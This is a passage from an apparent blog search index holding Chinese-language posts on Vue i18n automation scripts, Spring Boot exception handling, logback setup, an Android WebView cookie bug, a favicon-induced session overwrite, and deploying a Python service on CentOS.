读取文件,根据匹配规则查找目标，输出到指定文件def read_file_match_out(match_rule, exclude_rule, file_path_list, write_file): out_file = open(write_file, "w") for file_obj in file_path_list: file = open(file_obj, 'r') line = file.readline() while line: text_list = text_split_list(match_rule, exclude_rule, line) if not text_list: pass else: for text in text_list: out_file.write(text + '\n') line = file.readline() file.close() out_file.close()# 根据规则查找出目标文字，返回数组def text_split_list(match_rule, exclude_rule, text_str): for exr in exclude_rule: text_str = re.sub(exr, "", text_str) array_list = match_rule.split(text_str) while '' in array_list: array_list.remove('') return array_list# 根据你的实际情况if __name__ == '__main__': # 要匹配的文件路径和文件后缀 file_input_path = '/Users/lanshiqin/Temp/vue-demo' file_input_list = get_file_path_list(file_input_path, '.html') # 要匹配的规则 match_re = re.compile('[^\u4E00-\u9FA5]') # 要排除的规则数组 排除html中的&lt;!-- 和 // 注释 exclude_re = [r'&lt;!--.*$', r'//.*$'] # 匹配到的值要输出到的指定文件 file_out_path = '/Users/lanshiqin/Desktop/zh_cn.txt' # 匹配输出 read_file_match_out(match_re, exclude_re, file_input_list, file_out_path) 第二步：生成需要翻译的多语种js文件 GenerateUtils.py1234567891011121314151617181920212223# 生成多语言js文件def generate_language_js_files(file_input, file_output_list): for file_output in file_output_list: file_out = open(file_output + '.js', 'w') file_out.write('const ' + file_output + ' = &#123;\n') file = open(file_input, 'r') line = file.readline() while line: line = line.replace("\n", "") print(line) file_out.write("\t" + line + ": '" + line + "',\n") line = file.readline() file_out.write("&#125;") file.close() file_out.close()if __name__ == '__main__': # 第一步找到的简体中文 input_file = '/Users/lanshiqin/Desktop/zh_cn.txt' # 要输出的目标语种文件文件 output_file_list = ['cn', 'en'] # 生成多语言目标文件 generate_language_js_files(input_file, output_file_list) 第三步：替换html中的中文为VueI18n模板表达式，其中的键为语种文件的变量123456789101112131415161718192021222324252627282930313233343536373839# 按行读取文件内容转换成数组def read_file_to_list(file_input): file = open(file_input, 'r') line = file.readline() file_list = [] while line: line = line.replace('\n', '') file_list.append(line) line = file.readline() return file_list# 根据中文键名称替换目标文件集合中的中文为VueI18n的模板表达式def replace_I18n_template(key_list, file_path_list): for file_obj in file_path_list: file_obj_temp = '' for key in key_list: file = open(file_obj, 'r') line = file.readline() while line: line = line.replace(key, '&#123;&#123; $t("' + key + '") &#125;&#125;') file_obj_temp += line line = file.readline() file.close() file_write = open(file_obj, 'w') file_write.write(file_obj_temp) file_obj_temp = '' file_write.close()# 根据你的实际情况if __name__ == '__main__': # 读取指定文件包装成数组 input_file = '/Users/lanshiqin/Desktop/zh_cn.txt' file_key_list = read_file_to_list(input_file) # 要匹配的文件路径和文件后缀 file_input_path = '/Users/lanshiqin/Temp/vue-demo' file_input_list = get_file_path_list(file_input_path, '.html') # 对匹配的文件进行VueI18n模板表达式替换 replace_I18n_template(file_key_list, file_input_list) 这样一个传统的Vue构建的前端本地化工程，就可以实现一秒钟完成国际化的操作。如果觉得多语言文件中的键采用中文有不妥，可以继续采用匹配方案，将所有的键都批量重命名。默认采用中文作为键，这样做的目的是高效，精确，节省时间。我的考虑是：采用开发者原生语言作为键，也就是我们本土化的人都认识的语言，然后将对应的语言文件交给掌握本土化语言并且掌握目标要翻译语言的这样一个人，这样他就能够精确高效的翻译，翻译后的文件也是程序可直接使用的。 开发者无需关系键名和键值，如果比较强迫症，某一天突然想好了这个键要取什么名字，可以进行匹配替换操作。这里仅仅针对传统开发的Vue进行I18n的支持，如果需要翻译Android App的多语言文件，或者其他类似平台的多语言文件时，这些平台可能不能使用中文作为键，中文作为键可以认为是一个中间过程，等翻译工作全部完成后，再写个自动化脚本自动批量替换想好的键即可。 一键国际化演示 为了操作方便，我把3个python文件的代码都放在一个vue_language_global.py 文件中了github地址：https://github.com/lanshiqin/VueLanguageUtils欢迎 Star&amp;Fork 总结如果涉及到英语以及其他外语，单纯的国际化支持其实是不够的，除了不能用机器翻译外，还需要考虑每个字词对应的翻译内容长度，原先的UI设计和交互可能就需要改变，因此语言跨度比较大的国际化，一般会单独做一个版本。 本次遇到的需求其实是需要支持繁体中文，每个汉字对应一个繁体字，不涉及语法以及词序的问题。所以这步翻译操作可以采用调用api的方式完成自动化翻译生成文件。]]></content>
      <categories>
        <category>工作分享 Python 工具</category>
      </categories>
      <tags>
        <tag>自动化 工具 Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[全局异常处理机制]]></title>
    <url>%2F7545587%2F</url>
    <content type="text"><![CDATA[异常处理机制在后端开发中起着至关重要的作用。在Java后端开发中，Service层一般用来做业务逻辑层，这一层所出现的和业务无关的异常，应当往上一层抛出，最终在Controller层处理所有的异常，所以要定制一套完成的异常处理方案，针对不同的异常做不同的处理。 针对业务层的不同异常，要做各自的处理并合理返回，这里就不详细说明，主要记录一下全局异常的捕获和处理。 Spring Boot中默认对全局异常做了处理,用浏览器访问一个异常接口时，会返回一个error页面，并且把异常信息显示出来。当用PostMan等工具进行API请求的方式访问异常的接口时，会返回一个json数据。1234567&#123; "timestamp": "2018-09-09T03:52:05.850+0000", "status": 404, "error": "Not Found", "message": "异常信息", "path": "/xxxPath"&#125; 在大多数情况下，应该为不同的设备访问方式返回相同格式的信息，这里的json格式字段可能并不是业务所需要的。在实际业务中，当服务调用出现异常时，应该为调用者返回约定好的与业务相关的数据模型。比如Controller层在处理捕获到的异常后可以向外抛出一个ApiException，用来表示与业务无关的全局异常。新建ApiException类继承Exception12345678package com.lanshiqin.apiboot.controller.exception/** * API异常类 * 用来标注Controller调用的通用异常 * @author 蓝士钦 */class ApiException(message: String?) : Exception(message) 新建全局异常处理类 GlobalExceptionHandler1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.lanshiqin.apiboot.controller.handlerimport com.lanshiqin.apiboot.controller.exception.ApiExceptionimport com.lanshiqin.apiboot.model.ErrorInfoimport org.slf4j.LoggerFactoryimport org.springframework.web.bind.annotation.ControllerAdviceimport org.springframework.web.bind.annotation.ExceptionHandlerimport org.springframework.web.bind.annotation.ResponseBodyimport org.springframework.web.servlet.ModelAndViewimport javax.servlet.http.HttpServletRequest/** * 全局异常处理 * @author 蓝士钦 */@ControllerAdviceclass GlobalExceptionHandler&#123; /** * 统一异常处理方法 * 打印异常日志，并将错误信息输出到指定的页面 * @ httpServletRequest 请求对象 * @ exception 异常信息 */ @ExceptionHandler(value = [Exception::class]) fun defaultExceptionHandler(httpServletRequest: HttpServletRequest, exception: Exception): ModelAndView&#123; logger.error("全局异常: "+exception.printStackTrace().toString()) val modelAndView = ModelAndView() modelAndView.addObject("exception",exception) modelAndView.addObject("url",httpServletRequest.requestURL) modelAndView.viewName = DEFAULT_EXCEPTION_PAGE return modelAndView &#125; /** * API异常处理方法 * @ httpServletRequest 请求对象 * @ exception 异常信息 */ @ResponseBody @ExceptionHandler(value = [ApiException::class]) fun apiExceptionHandler(httpServletRequest: HttpServletRequest, exception: Exception): ErrorInfo&lt;String&gt; &#123; logger.error("API异常: "+exception.printStackTrace().toString()) val errorInfo: ErrorInfo&lt;String&gt; = ErrorInfo() errorInfo.code=500 errorInfo.message=exception.message errorInfo.data="API异常" return errorInfo &#125; companion object &#123; const val DEFAULT_EXCEPTION_PAGE = "exception" val logger = LoggerFactory.getLogger(GlobalExceptionHandler::class.java)!! &#125;&#125; 处理异常的方法上需要添加@ExceptionHandler注解，value值是一个数组，用来声明这个方法要处理哪些异常。当异常匹配方法时才会进入方法体执行相应的逻辑。 在resources/template下新建页面 exception.html123456789101112&lt;!DOCTYPE html&gt;&lt;html lang="en" xmlns:th="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;统一异常处理&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;发生异常&lt;/h1&gt; &lt;div th:text="$&#123;url&#125;"&gt;&lt;/div&gt; &lt;div th:text="$&#123;exception.message&#125;"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 需要注意的是，SpringBoot有几个可选的视图模板引擎，虽然做了默认配置的，但是还是需要在Gradle中引用依赖,否则无法正常解析指定的模板页面1compile('org.springframework.boot:spring-boot-starter-thymeleaf') 在全局异常处理类中，定义了两个方法，一个用来处理未捕获的异常，并且返回html页面进行显示。在API后端接口服务开发中，应当在Controller层处理掉所有异常，所以以非json来输出这个页面一方面是用来显示错误信息，另一方面是用来说明API接口写的有问题。客户端在API请求时如果接受到这样的html，会无法解析按照约定的json格式。这个异常页面用来提示后端开发人员应当在Controller层处理掉异常，抛出ApiException。 一个相对正确的API接口，Controller示例如下12345678910111213141516171819202122232425262728/** * 用户信息Controller * @author 蓝士钦 */@RestControllerclass UserInfoController&#123; /** * 用户信息Service */ @Autowired val userInfoService: UserInfoService?=null /** * 添加用户信息 */ @PutMapping("/addUserInfo") fun addUserInfo(@RequestBody userInfo: UserInfo): Any&#123; return try &#123; userInfoService!!.saveUserInfo(userInfo) &#125;catch (e: Exception)&#123; // 捕获并处理异常 // ... // 抛出ApiException throw ApiException(e.message) &#125; &#125;&#125; Controller一定要捕获并且处理掉所有异常，然后向外返回一个约定好的处理失败的信息格式。这里最后抛出ApiException，全局异常处理类中会拦截到这个异常并且做异常日志记录，返回异常信息给调用者。 注：业务层捕获到自己业务范围内的异常时要自己处理掉，并且根据情况终止业务，把异常状态返回给调用者告知异常。业务层不应该处理掉不属于自己业务范围的异常，比如Exception等，而是应该往上抛出给Controller，让Controller来处理。Controller处理掉Service抛出的异常，要处理掉并且返回约定好的异常对象格式给调用者，记录全局异常日志。]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[logback日志系统配置]]></title>
    <url>%2Fa6a1e8bd%2F</url>
    <content type="text"><![CDATA[最近在使用SpringBoot搭建一个通用的API开发框架，主要记录在API框架搭建过程中的一些学习笔记。我认为在API框架中最基础也是最重要的部分是：日志系统、异常机制、事务控制。其中日志系统是最基础的核心部分，对于后端系统来说，需要记录所有的请求、操作日志、异常输出等各种信息，使得开发人员在系统出现问题时能够有据可依，快速定位并找出问题所在。Spring Boot内置了slf4j(Simple Logging Facade for Java)日志API和具体的日志实现logback。可以将logback替换成Log4j或者其他日志框架，但是我还是推荐使用默认的logback，因为它是Log4j的作者新开源的日志框架。 在Spring Boot中启用logback记录日志：只需要在配置文件中配置输出目录即可:application.yml123456# 日志配置logging: # 日志文件路径 path: log # 日志文件名称(可选，默认为spring，输出的日志文件名为spring.log) file: app 启动项目后，控制台输出的日志将会被写入到当前项目的log文件夹下的spring.log文件中。 在大多数场景下，一般希望日志能够记录客户端每次请求的url，请求方式，ip地址等信息，用于后续的数据统计和分析。 新建日志拦截器类LoggerInterceptor继承自HandlerInterceptor接口并实现preHandle方法123456789101112131415161718192021222324package com.lanshiqin.apiboot.controller.interceptorimport org.slf4j.LoggerFactoryimport org.springframework.stereotype.Componentimport org.springframework.web.servlet.HandlerInterceptorimport javax.servlet.http.HttpServletRequestimport javax.servlet.http.HttpServletResponse/** * 日志拦截器 * @author 蓝士钦 */@Componentclass LoggerInterceptor : HandlerInterceptor &#123; val logger = LoggerFactory.getLogger(LoggerInterceptor::class.java)!! override fun preHandle(request: HttpServletRequest, response: HttpServletResponse, handler: Any): Boolean &#123; logger.info("IP:$&#123;request.remoteAddr&#125; METHOD:$&#123;request.method&#125; UR:$&#123;request.requestURL&#125;") return super.preHandle(request, response, handler) &#125;&#125; 新建拦截器配置类InterceptorConfigAdapter继承自WebMvcConfigurer接口并实现addInterceptors方法1234567891011121314151617181920212223242526package com.lanshiqin.apiboot.controller.configimport com.lanshiqin.apiboot.controller.interceptor.LoggerInterceptorimport org.springframework.beans.factory.annotation.Autowiredimport org.springframework.context.annotation.Configurationimport org.springframework.web.servlet.config.annotation.InterceptorRegistryimport org.springframework.web.servlet.config.annotation.WebMvcConfigurer/** * 拦截器配置 * @author 蓝士钦 */@Configurationclass InterceptorConfigAdapter : WebMvcConfigurer&#123; // 依赖注入日志拦截器 @Autowired val loggerInterceptor: LoggerInterceptor ? = null override fun addInterceptors(registry: InterceptorRegistry) &#123; // 注册日志拦截器，指定要拦截的路径和要排除的路径 registry.addInterceptor(loggerInterceptor!!) .addPathPatterns("/**") .excludePathPatterns("/error","/doc.html") &#125;&#125; 可以根据业务需要添加任意多个拦截器类，并且在拦截器配置的addInterceptors方法中，将注入的拦截器注册到系统中。addPathPatterns为这个拦截器要拦截的地址 /**表示拦截所有地址，除了excludePathPatterns之外的地址。excludePathPatterns为这个拦截器要排除的地址，访问doc.html所在地址，发现不会进入日志拦截器，这个排除很有用，比如doc.html是API框架的在线调试文档，并不需要将请求记录到日志中。还可以实现登录拦截器，方便直观的配置哪些是需要登录才能访问的，哪些是不需要登录就可以访问的资源，通过拦截器配置可以直观清晰的罗列出来。 这里甚至看不到logback的配置，因为SpringBoot除了集成logback，还对logback做了默认配置能够看到的就是slf4j的api操作，也就是代码中的记录日志的语句。123456789// 通过slf4j提供的方法得到logger对象val logger = LoggerFactory.getLogger(XXX::class.java)// 通过slf4j的API定义的方法，在代码中输出不同级别的日志logger.info()logger.warn()logger.debug()logger.trace()logger.error() 具体的输出实现是由实现slf4j的日志框架实现的。Spring Boot对logback做了默认配置，将所有的级别日志都统一输出到了同一个文件。在实际场景下，我们需要将不同级别的日志输出到不同文件，比如info.log 和error.log在业务代码中通过相应的逻辑处理，输出相应级别的日志，这样相关人员可以更加精确的查找分析问题。 根据不同级别，将日志分别输出到不同的文件： logback日志文件的命名和加载顺序息息相关，logback.xml先于application.yml加载。logback-spring.xml晚于application.yml加载，如果logback配置需要使用application.yml中的属性，则需要命名为logback-spring.xml logback配置文件中使用application.yml中的属性,需要使用springProperty标签来引用 在resources目录下新建文件 logback-spring.xml1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;configuration&gt; &lt;!--日志文件存放路径，读取application.yml中的配置，读取不到时使用defaultValue默认值--&gt; &lt;springProperty scope="context" name="logPath" source="logging.path" defaultValue="logs"/&gt; &lt;!--日志文件名称，读取application.yml中的配置，读取不到时使用defaultValue默认值--&gt; &lt;springProperty scope="context" name="logFile" source="logging.file" defaultValue="api-boot"/&gt; &lt;!--定义属性值，日志文件存放路径--&gt; &lt;property name="LOG_HOME" value="$&#123;logPath&#125;"/&gt; &lt;!--定义属性值，日志文件名称--&gt; &lt;property name="LOG_FILE" value="$&#123;logFile&#125;"/&gt; &lt;!--控制台输出--&gt; &lt;appender name="STDOUT" class="ch.qos.logback.core.ConsoleAppender"&gt; &lt;encoder&gt; &lt;pattern&gt;%boldCyan(%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125;) - %boldRed(%5p) %blue([%10.10t]) %magenta(%-35.35logger&#123;20&#125;) %yellow(%2M) %green(%2L) : %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;/appender&gt; &lt;!--INFO级别日志--&gt; &lt;appender name="INFO" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;filter class="ch.qos.logback.classic.filter.LevelFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;onMatch&gt;DENY&lt;/onMatch&gt; &lt;onMismatch&gt;ACCEPT&lt;/onMismatch&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %X&#123;LOG_ID&#125; [%thread] %-5level %logger&#123;100&#125;.%method\(\):%L - %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;!--滚动策略--&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--文件输出路径和名称--&gt; &lt;fileNamePattern&gt;$&#123;LOG_HOME&#125;/$&#123;LOG_FILE&#125;.info.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;!--ERROR级别日志--&gt; &lt;appender name="ERROR" class="ch.qos.logback.core.rolling.RollingFileAppender"&gt; &lt;filter class="ch.qos.logback.classic.filter.ThresholdFilter"&gt; &lt;level&gt;ERROR&lt;/level&gt; &lt;/filter&gt; &lt;encoder&gt; &lt;pattern&gt;%d&#123;yyyy-MM-dd HH:mm:ss.SSS&#125; %X&#123;LOG_ID&#125; [%thread] %-5level %logger&#123;100&#125;.%method\(\):%L - %msg%n&lt;/pattern&gt; &lt;/encoder&gt; &lt;!--滚动策略--&gt; &lt;rollingPolicy class="ch.qos.logback.core.rolling.TimeBasedRollingPolicy"&gt; &lt;!--文件输出路径和名称--&gt; &lt;fileNamePattern&gt;$&#123;LOG_HOME&#125;/$&#123;LOG_FILE&#125;.error.%d&#123;yyyy-MM-dd&#125;.log&lt;/fileNamePattern&gt; &lt;/rollingPolicy&gt; &lt;/appender&gt; &lt;root level="info"&gt; &lt;appender-ref ref="STDOUT" /&gt; &lt;appender-ref ref="INFO" /&gt; &lt;appender-ref ref="ERROR" /&gt; &lt;/root&gt;&lt;/configuration&gt; 这样就将info和error级别的日志输出到了指定目录下的不同文件。]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Java 后端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android低版本WebView引起的BUG]]></title>
    <url>%2F48b8924c%2F</url>
    <content type="text"><![CDATA[最近上线的一个项目，Android客户端采用原生和非原生混合开发，后端API采用Session机制认证，出现部分Android机型无法使用WebView中加载的核心业务，通过抓包发现，某些客户端在使用WebView发起请求时没有带上登录时得到的SESSIONID,Android开发人员通过日志输出证实有把登录的SESSIONID同步设置给WebView的Cookie，并且通过cookieManager.getCookie方法能够取到同步设置的Cookie。于是我只能自己再进一步验证一下，最终找到问题所在。 测试的主要问题如下：1.部分Android机型(部分厂商的7.x和8x的Android版本号)无法请求到Web页面，会被后端拦截2.我用Android 5.x 到 9.x 的模拟器测试完全正常，抓包时请求头的Cookie中也正常携带SESSIONID，但是用户真实机型出现不携带Cookie的情况3.Android开发人员确实把SESSIONID同步设置给WebView的Cookie了，客户端设置的Cookie也可以通过getCookie方法取出来，但是抓包发现在某些机型上WebView加载URL的时候并没有带上Cookie。 回想了一下之前Android开发中曾经遇到的坑，于是用Android4.3版本的模拟测试了一下，发现请求头中国然也没带上Cookieandroid4.3WebView加载接口地址时，请求头数据包如下图所示： 可以看到4.3版本的AndroidWebKit在请求头中存在不携带Cookie的情况用android5.0版本的模拟器测试了一下，发现请求头中有携带Cookie所以，这些机型的产商可能要摸一下自己的良心了，为了减少ROM的开发成本，是不是把部分低版本的WebKit内核直接照搬编译到新系统里了？在网上经常可以看到一堆相互抄袭的文章，WebView同步Cookie的方法如下：12345678910111213141516/** * 同步cookie */public static void synCookies(Context context, String url) &#123; CookieSyncManager.createInstance(context); CookieManager cookieManager = CookieManager.getInstance(); cookieManager.setAcceptCookie(true); // 删除Cookie（可选） cookieManager.removeSessionCookie(); cookieManager.setCookie(url, "登录时得到的SESSIONID"); CookieSyncManager.getInstance().sync(); // 可以日志输出再验证一下 String cookie = cookieManager.getCookie(url); ...&#125;这段代码乍一看没什么问题，虽然getCookie可以取到设置进去的Cookie，但是请求时存在没带上Cookie的情况。问题就出在同步方法上。如果刚好看过4.x的源码，会发现和现在的版本有比较大的不一样。这里最大的区别是:4.3版本的removeSessionCookie方法删除Cookie是异步的sync同步设置Cookie也是异步的。也就是说他可能在你设置了Cookie之后才执行remove操作，或者在WebView请求后才设置Cookie，WebView发起请求时要么Cookie还没被设置，要么就是已经被删除。所以在WebView加载URL发起请求时根本没有把Cookie带上。 一、Android5.0及以上的WebView操作Cookie后的时序图 二、Android4.3版本）操作Cookie后的时序图 解决方案 WebView使用Post请求就可以在头部带上自定义参数，需要后端接口也跟着一起改 Android客户端删除Cookie操作后面加上等待时间比如 Sleep 1000L。 上面这两种方案只是解决问题，但是并不是规范的，其实CookieSyncManager类和cookieManager的很多方法已经被标注为弃用https://developer.android.com/reference/android/webkit/CookieSyncManager 通过android官方文档可知，这些都被标注了@Deprecated，所以开发者在开发的时候要考虑兼容性问题，针对大众的产品要足够的细心 出现这些BUG的主要原因在我写这篇文章时，Google官方虽然以及将Android更新到了9.0的版本，但是目前在中国市场还存在很多版本碎片化的问题，网上有很多过时的API示例，国内的很多文章都相互抄袭，有的根本没有自己试验过就拷贝过来发表，这样的传播是非常不负责任的。 另外还有一个主要因素是很多厂商喜欢自己定制，曾经我还在开发Android应用时，就遇到某个厂商把摄像头拍照回调的API修改了，导致横竖屏切换的的问题，这种定制可以说是非常恶心来形容了，可能这也是我弃坑的原因之一吧。另外我真的非常喜欢写后台，所以现在能够写API接口感到很欣慰。 曾几何时，依稀记得在学校工作室的时光，曾经的方老师跟我们说过这样一句话“遇到问题不要说我是学Android的，后端的我不管…,不要说什么从Android开发转后端开发这样的话，你曾经学到的知识就是你自己的，没有转行，都是开发，能在一个领域有所成就取决于你有多专注”。原话虽然记得不是很清楚，但是大体就是这个意思，这句话到现在一直铭记在我脑海里。所以遇到问题我不怕，我的想法只有一个：找出问题，并解决它。]]></content>
      <categories>
        <category>工作分享</category>
      </categories>
      <tags>
        <tag>问题解决 网络分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个favicon.ico图标引发的重大事故]]></title>
    <url>%2F285afbcd%2F</url>
    <content type="text"><![CDATA[也许很难让人相信，一个favicon.ico图标会引起重大事故，而我真的就亲身经历了一回。最近上线的一个项目出现了匪夷所思的事情。如果不去抓包分析，就真的就可以称得上玄学了。这个项目分为API后端和Android客户端以及嵌入WebView的网页。客户端除了登录和一些基本的API是原生操作以外，其他核心业务都是在WebView加载的网页上进行交互的。项目发布生产环境上线后，部分机型的用户反应核心功能无法使用，在一定程度上造成了很严重的问题。最终定位到问题在ico图标，下面进行详细的分析。 在App客户端中嵌入WebView，进行原生和非原生的混合开发在现今依然是成本迭代的产物。在很多场合下API之间的请求越来越多的采用Token机制代替Session，但是Session也有自己的一套自己的完善方案来保证API安全，这里不做Token和Session的对比。 由于项目的特殊性，客户端和服务端的API接口采用Session机制 测试的主要问题如下：1.APP客户端对测试环境的所有请求完全正常，但是在生产环境下，后续页面中的Ajax请求的核心业务异常2.PC浏览器打开对应的网页，无论测试环境还是生产环境，全部都是正常的 针对这个问题，是无法从编码的角度发现的，所以必须抓包分析一下区别根据抓包的数据分析并且找到了问题所在，我把抓到的包 通过下面的测试环境和生产环境的请求时序图简要的罗列了出来。 一、测试环境的请求在混合开发中，客户端和服务端正常的请求响应如下图所示:Android客户端有原生的API请求和WebView请求两个部分，其中登录请求是用Android原生的请求实现的，并且把登录后得到的SessionID通过Cookie同步设置给WebView。这样WebView在后续请求时会自动带上其中绿色的生命线部分代表客户端的WebView（为了偷懒这里简化了时序图） 二、生产环境的请求 通过时序图可知，生产环境下部署了很多项目，其中有个WEB服务的域名为www.pro-web.com,而我们的后端API服务部署在这个域名的子目录下面：www.pro-web.com/api/ 低版本Android的WebView在发起请求时，默认会请求对应域名的favicon.ico资源。这个域名改好被WEB服务A拦截，重新分配了一个SESSIONID给WebView，通过响应头的Set-Cookie将旧的Cookie中的SESSIONID覆盖。由于这个SESSIONID是WEB服务A分配的，导致后续的Ajax请求API服务端时，API服务无法根据SESSIONID找出对应的SESSION，认为该用户没有登录，所以无法进行正常的业务请求。 二、得出的结论由于Android不同版本号的WebView的请求方式有区别，所以在请求接口地址www.pro-web.com/api/的资源时，会自动请求www.pro-web.com域名下的favicon.ico图标。 而且刚好www.pro-web.com这个域名下有其他的Web服务拦截了ico请求,并且重定向到了这个Web服务的其他业务，导致重新分配了一个改Web服务对应的SESSIONID，通过返回体头中的Set-Cookie自动将客户端原本的SESSIONID覆盖。造成了后续服务的不可用。 解决方案1.android的WebView设置不请求网站的favicon.ico资源2.在xxx.html中添加ico资源，优先级最高，这样就不会再去请求ico资源3.相同域名下如果有多个项目，需要为每个项目配置各自的上下文，不能出现上下文嵌套的情况4.使用Token机制进行API接口验证，这样就避免了服务端拦截资源后Set-Cookie把客户端登录时正常的SESSIONID覆盖 方案1：考虑到android开发比较忙，沟通的成本比较大方案3：旧项目的生产环境地址已经用了很久，修改上下文可能会造成其他的服务调用问题。方案4：从Session到Token迁移需要很大的工作量，尤其是已经上线的服务比较多的时候，会牵一发而动全身。 所以最终采用方案2，在API服务端这里做修改xxx.html的head中添加如下：1&lt;link rel="icon" href="data:image/ico;base64,aWNv"&gt; 建议：将每个项目都用不同的二级域名注：即使设置了二级域名，某些内核版本的浏览器依旧会请求favicon.ico图片，如果二级域名找不到，就会到顶级域名查找。如果顶级域名下对应的项目有资源拦截的业务把ico拦截了，那么依然有可能出问题，所以服务端一定要规范。有的时候妥协不是为了相互甩锅和接锅，是为了整个项目能够正常进行，要不断进行尝试，为大局着想。]]></content>
      <categories>
        <category>工作分享</category>
      </categories>
      <tags>
        <tag>问题记录 网络分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[部署python项目到linux服务器]]></title>
    <url>%2Fd8d0505b%2F</url>
    <content type="text"><![CDATA[工作之余我最喜欢的编程语言是Python，因为它能够快速的解决我的问题，比如写个外挂或者其他自动化脚本之类的程序，依靠强大的第三方库可以快速方便的解决问题。最近用Python写了个外挂，需要部署到Linux环境的服务器上，由于之前本地开发时使用virtualenv，使用这个虚拟环境有个好处是项目中依赖的库不会是全局的，只在当前项目的目录下有效，因为我是Mac系统，virtualenv环境下的库文件和linux上所需要的库不通用，所以不能简单的将整个env拷贝到服务器运行，需要做一些额外的工作。 一般每个不同的项目都会依赖各自的库，有些库的版本不一样会引起冲突，为了解决这个问题，需要使用虚拟环境，Python可以在每个项目目录下创建各自的虚拟环境，项目所依赖的包就在环境目录下，这样避免了库版本的冲突，也方便相同操作系统间可以快速的拷贝项目运行。 我使用的是Python3编写的项目，CentOS 7的服务器上只有Python2，所以需要先安装一下Python3的环境 第一步：安装Python3环境1.首先安装编译环境(后续需要从python官网获取Python3的源码自己编译python)1yum install zlib-devel bzip2-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make 2.从官网下载python3的源码1wget https://www.python.org/ftp/python/3.6.2/Python-3.6.2.tar.xz 3.依次执行 解压&gt;进入解压后的目录&gt;编译安装1234tar -xvJf Python-3.6.2.tar.xzcd Python-3.6.2./configure prefix=/usr/local/python3make &amp;&amp; make install 4.安装完毕，创建软连接12345ln -s /usr/local/python3/bin/python3 /usr/bin/python# 执行命令python -V #将会看到python3的版本# 执行命令python2 -V #将会看到python2的版本 5.后续工作，由于执行CentOS的yum命令需要使用自带的python2的版本，所以需要做两处修改123vim /usr/bin/yumvim /usr/libexec/urlgrabber-ext-down#将 这两个文件的 #! /usr/bin/python修改为 #! /usr/bin/python2 第二步：将本地开发环境的依赖项目生成清单文件1.在本地的开发环境中，env下执行：1pip3 freeze &gt;requirements.txt 清单文件将会生成在当前项目目录下，内容如下所示12345certifi==2018.4.16chardet==3.0.4idna==2.7requests==2.19.1urllib3==1.23 将生成后的文件上传到linux服务器 2.将Python项目上传到服务器1#略... 第三步：在linux服务器上为项目创建虚拟环境，并安装项目所需的依赖1.切换到pip3所在的目录 /usr/local/python/bin，执行以下命令1234567891011121314151617# 安装虚拟环境pip3 install virtualenv# 创建虚拟环境 ENVvirtualenv ENV# 切换到虚拟环境所在的目录cd ENV# 启用虚拟环境source ./bin/activate# 安装依赖清单里的库pip3 install -r requirements.txt# 列出当前虚拟环境所安装的依赖库pip3 list 第四步：添加自定义系统服务（很重要）12# 这样的命令在ssh终端退出后，python进程也会被杀掉python xxx.py &amp; 需要创建一个自定义的系统服务，来保证python程序能够在后台运行。 1.创建系统服务1vim /usr/lib/systemd/system/robot.service 内容如下：1234567891011[Unit]Description=robotAfter=network.target [Service]Type=forkingExecStart=/usr/local/python3/bin/ENV/bin/python /usr/local/python3/bin/ENV/p3.py &amp;PrivateTmp=true [Install]WantedBy=multi-user.target ExecStart为服务启动时执行的命令，不能用相对路径， 一定要全路径。这里也可以将命令写到任意的.sh文件中，这里写.sh文件的全路径也是可以的。 2.启用自定义系统服务1systemctl enable robot 3.启动服务1systemctl start robot 可以查看进程，确认一下服务是否启动1ps aux|grep robot 完毕！]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态替换JVM中的Class字节码]]></title>
    <url>%2Fb67783e4%2F</url>
